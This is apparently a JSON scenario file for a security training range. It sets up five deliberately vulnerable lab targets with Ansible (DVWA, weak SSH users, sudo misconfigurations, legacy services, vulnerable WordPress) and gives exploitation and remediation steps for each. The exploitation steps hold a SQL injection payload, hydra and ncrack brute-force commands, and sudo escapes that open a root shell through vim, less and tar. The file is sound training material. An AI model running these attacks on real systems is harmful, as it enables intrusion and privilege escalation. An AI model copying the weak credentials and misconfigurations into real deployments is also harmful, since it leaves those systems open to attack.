{
  "description": "Ansible-based exploit examples using playbook references",
  "usage": "POST to /api/reaper/exploits/import or use Reaper UI Import button",
  "notes": {
    "playbook_location": "Playbooks should be in glassdome/vulnerabilities/playbooks/",
    "ansible_vars": "Override default playbook variables with ansible_vars",
    "advantages": "Better idempotency, error handling, and complex multi-step scenarios"
  },
  "exploits": [
    {
      "name": "ansible-dvwa-complete",
      "display_name": "DVWA Full Installation (Ansible)",
      "description": "Complete DVWA deployment with SQL injection, XSS, command injection, and more",
      "exploit_type": "web",
      "severity": "high",
      "cvss_score": "8.0",
      "target_os": "linux",
      "target_services": ["apache2", "mysql", "php"],
      "ansible_playbook": "web/inject_sqli.yml",
      "ansible_vars": {
        "dvwa_security_level": "low",
        "mysql_root_password": "dvwa_training_123",
        "dvwa_db_user": "dvwa",
        "dvwa_db_password": "dvwa_pass"
      },
      "exploitation_steps": "1. Navigate to http://target/dvwa\n2. Login: admin/password\n3. Complete database setup\n4. Navigate to SQL Injection\n5. Enter: ' OR '1'='1' --\n6. Explore other vulnerabilities: XSS, File Upload, Command Injection",
      "remediation_steps": "1. Use parameterized queries for SQL\n2. Implement Content Security Policy for XSS\n3. Validate file types and content for uploads\n4. Avoid shell commands with user input",
      "tags": ["owasp-top-10", "web", "sqli", "xss", "ansible", "training"]
    },
    {
      "name": "ansible-weak-ssh-multi",
      "display_name": "Multiple Weak SSH Users (Ansible)",
      "description": "Creates multiple users with weak passwords for brute-force training",
      "exploit_type": "credential",
      "severity": "high",
      "cvss_score": "7.5",
      "target_os": "linux",
      "target_services": ["ssh"],
      "ansible_playbook": "system/weak_ssh.yml",
      "ansible_vars": {
        "users": [
          {"name": "admin", "password": "admin123"},
          {"name": "developer", "password": "dev2024"},
          {"name": "backup", "password": "backup"},
          {"name": "testuser", "password": "password"}
        ],
        "enable_password_auth": true
      },
      "exploitation_steps": "1. Run hydra: hydra -L users.txt -P passwords.txt ssh://target\n2. Or use ncrack: ncrack -p 22 -U users.txt -P passwords.txt target\n3. Login with found credentials\n4. Attempt privilege escalation",
      "remediation_steps": "1. Enforce strong password policies\n2. Disable password authentication\n3. Use SSH key-based authentication only\n4. Implement fail2ban or similar",
      "tags": ["credential", "ssh", "brute-force", "ansible"]
    },
    {
      "name": "ansible-sudo-misconfiguration",
      "display_name": "Sudo Misconfigurations (Ansible)",
      "description": "Multiple sudo misconfigurations for privilege escalation training",
      "exploit_type": "privesc",
      "severity": "high",
      "cvss_score": "7.8",
      "target_os": "linux",
      "ansible_playbook": "system/weak_sudo.yml",
      "ansible_vars": {
        "vuln_users": [
          {
            "name": "devops",
            "password": "devops123",
            "sudo_command": "/usr/bin/vim"
          },
          {
            "name": "admin",
            "password": "admin123", 
            "sudo_command": "/usr/bin/less"
          },
          {
            "name": "backup",
            "password": "backup123",
            "sudo_command": "/bin/tar"
          }
        ]
      },
      "exploitation_steps": "1. Check sudo permissions: sudo -l\n2. For vim: sudo vim -c ':!bash'\n3. For less: sudo less /etc/passwd, then !bash\n4. For tar: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
      "remediation_steps": "1. Review all sudoers entries\n2. Remove NOPASSWD where not needed\n3. Use specific command restrictions\n4. Avoid editors/pagers in sudo",
      "tags": ["privesc", "sudo", "gtfobins", "ansible"]
    },
    {
      "name": "ansible-network-services",
      "display_name": "Exposed Network Services (Ansible)",
      "description": "Deploys multiple misconfigured network services for scanning practice",
      "exploit_type": "network",
      "severity": "medium",
      "cvss_score": "5.3",
      "target_os": "linux",
      "target_services": ["telnet", "rsh", "rexec", "finger"],
      "ansible_playbook": "network/open_ports.yml",
      "ansible_vars": {
        "install_telnet": true,
        "install_rsh": true,
        "install_finger": true,
        "open_ports": [23, 79, 512, 513, 514]
      },
      "exploitation_steps": "1. Full port scan: nmap -sV -p- target\n2. Connect to telnet: telnet target\n3. Enumerate users: finger @target\n4. Check rsh: rsh target command",
      "remediation_steps": "1. Disable legacy protocols (telnet, rsh, finger)\n2. Use SSH for remote access\n3. Implement firewall rules\n4. Regular port scanning and auditing",
      "tags": ["network", "legacy-protocols", "scanning", "ansible"]
    },
    {
      "name": "ansible-wordpress-vulns",
      "display_name": "Vulnerable WordPress Installation (Ansible)",
      "description": "WordPress with vulnerable plugins and weak admin credentials",
      "exploit_type": "web",
      "severity": "high",
      "cvss_score": "8.5",
      "target_os": "linux",
      "target_services": ["apache2", "mysql", "php"],
      "ansible_playbook": "web/wordpress_vulnerable.yml",
      "ansible_vars": {
        "wp_admin_user": "admin",
        "wp_admin_password": "admin123",
        "wp_version": "5.0",
        "vulnerable_plugins": [
          "easy-wp-smtp",
          "duplicator",
          "loginizer"
        ],
        "mysql_root_password": "wp_training_db"
      },
      "exploitation_steps": "1. Run wpscan: wpscan --url http://target --enumerate\n2. Try weak credentials: admin/admin123\n3. Check vulnerable plugins\n4. Attempt plugin exploits via searchsploit",
      "remediation_steps": "1. Use strong admin passwords\n2. Keep WordPress and plugins updated\n3. Remove unused plugins\n4. Implement WAF and security plugins",
      "tags": ["wordpress", "web", "cms", "plugins", "ansible"]
    }
  ]
}

